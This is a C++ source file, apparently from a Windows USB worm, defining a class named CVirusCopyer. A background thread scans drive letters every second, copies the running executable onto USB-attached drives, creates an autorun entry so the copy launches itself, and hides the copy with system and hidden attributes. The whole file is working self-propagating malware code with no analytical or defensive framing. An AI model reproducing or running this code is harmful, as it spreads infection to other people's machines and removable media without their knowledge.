#include "StdAfx.h"
#include "VirusCopyer.h"
#include "AutoBuilder.h"

#include <winioctl.h>

DWORD WINAPI USBListener(LPVOID lpParam);

CVirusCopyer::CVirusCopyer(void)
{
	::CreateThread(NULL, NULL, USBListener, this, 0, &this->threadId);
}

CVirusCopyer::~CVirusCopyer(void)
{
}

DWORD WINAPI USBListener(LPVOID lpParam)
{
	CVirusCopyer* copyer = (CVirusCopyer*)lpParam;
	while(true)
	{
		for (TCHAR volLabel = 'c';volLabel <= 'z';volLabel++)
		{
			if (copyer->IsUSBDevice(volLabel) == TRUE)
			{
				copyer->copy(volLabel);
			}

			if (copyer->IsFixedDevice(volLabel) == TRUE)
			{
				copyer->copy(volLabel);
			}
		}
		::Sleep(1000);
	}
	return 0;
}

/*
int CVirusCopyer::getUSBDrive(DWORD mask)
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (mask & 0x1)//看该驱动器的状态是否发生了变化
		{
			if (IsUSBDevice((i +'A')))
			{
				USBDriveVol.push_back(i +'A');
			}
		}
		mask = mask >> 1;
	}

	return USBDriveVol.size();
}
*/

BOOL CVirusCopyer::IsUSBDevice(TCHAR label)
{
	wstring strVolume = label + _T(":");
	BOOL bRet = FALSE;
	UINT uDevType = ::GetDriveType(strVolume.c_str());
	if (uDevType == DRIVE_REMOVABLE)
	{
		wstring strDevFile = _T("\\\\.\\");
		strDevFile += strVolume;
		HANDLE hDevFile = ::CreateFile(strDevFile.c_str(),GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,OPEN_EXISTING,0,NULL);
		if (hDevFile == INVALID_HANDLE_VALUE) return FALSE;

		STORAGE_DEVICE_DESCRIPTOR devDesc;
		devDesc.Size = sizeof(STORAGE_DEVICE_DESCRIPTOR);
		STORAGE_PROPERTY_QUERY query;
		query.PropertyId = StorageDeviceProperty;
		query.QueryType = PropertyStandardQuery;

		DWORD dwBufferSize;
		BOOL bResult = ::DeviceIoControl(hDevFile,IOCTL_STORAGE_QUERY_PROPERTY,&query,sizeof(STORAGE_PROPERTY_QUERY),
			&devDesc,devDesc.Size,&dwBufferSize,NULL);
		if (bResult && devDesc.BusType == BusTypeUsb)
		{
			bRet = TRUE;
		}

		::CloseHandle(hDevFile);
	}

	return bRet;
}

BOOL CVirusCopyer::IsFixedDevice(TCHAR label)
{
	wstring strVolume = label + _T(":");
	BOOL bRet = FALSE;
	UINT uDevType = ::GetDriveType(strVolume.c_str());
	if (uDevType == DRIVE_FIXED)
	{
		wstring strDevFile = _T("\\\\.\\");
		strDevFile += strVolume;
		HANDLE hDevFile = ::CreateFile(strDevFile.c_str(),GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,OPEN_EXISTING,0,NULL);
		if (hDevFile == INVALID_HANDLE_VALUE) return FALSE;

		STORAGE_DEVICE_DESCRIPTOR devDesc;
		devDesc.Size = sizeof(STORAGE_DEVICE_DESCRIPTOR);
		STORAGE_PROPERTY_QUERY query;
		query.PropertyId = StorageDeviceProperty;
		query.QueryType = PropertyStandardQuery;

		DWORD dwBufferSize;
		BOOL bResult = ::DeviceIoControl(hDevFile,IOCTL_STORAGE_QUERY_PROPERTY,&query,sizeof(STORAGE_PROPERTY_QUERY),
			&devDesc,devDesc.Size,&dwBufferSize,NULL);
		if (bResult && devDesc.BusType == BusTypeUsb)
		{
			bRet = TRUE;
		}

		::CloseHandle(hDevFile);
	}

	return bRet;
}

BOOL CVirusCopyer::copy(TCHAR USBinfo)
{
	TCHAR   chPath[256]; 
	memset(chPath,0,256); 
	GetModuleFileName(NULL,chPath,256); 

	int first = -1;
	int end = -1;

	for (int i = 0;i < 256;i++)
	{
		if (chPath[i] == _T('\\'))
		{
			if (first == -1)
			{
				first = i;
			}
			else
			{
				end = i;
			}
		}

		if (chPath[i] == _T('\0'))
		{
			break;
		}
	}

	TCHAR   destPath[256];
	memset(destPath, 0, 256);

	int error = ::GetLastError();

	wmemcpy(destPath, chPath, first);
	wmemcpy(destPath + first, chPath + end, 256 - end - 1);
	destPath[0] = USBinfo;

	BOOL result = CopyFile(chPath,destPath, false);

	// 复制成功了，则开始处理其余事宜
	if (result != 0)
	{
		// 创建Autorunwe
		CAutoBuilder* builder = new CAutoBuilder();
		wstring path;

		path.append(destPath);

		wstring::size_type index = path.find_last_of('\\');

		builder->setExec(path.substr(index + 1));
		builder->buildAutorun(USBinfo);

		//
		SetFileAttributes(destPath, 
			FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	}
	
	return result;
}
/*
bool CVirusCopyer::copyToUsb()
{
	vector<char>::const_iterator iter;
	BOOL result = 0;

	for (iter = USBDriveVol.begin();iter != USBDriveVol.end();iter++)
	{
		result= copy(*iter);
	}

	if (result == 0)
		return false;
	else
		return true;
}

bool CVirusCopyer::copyToDisk()
{
	return false;
}*/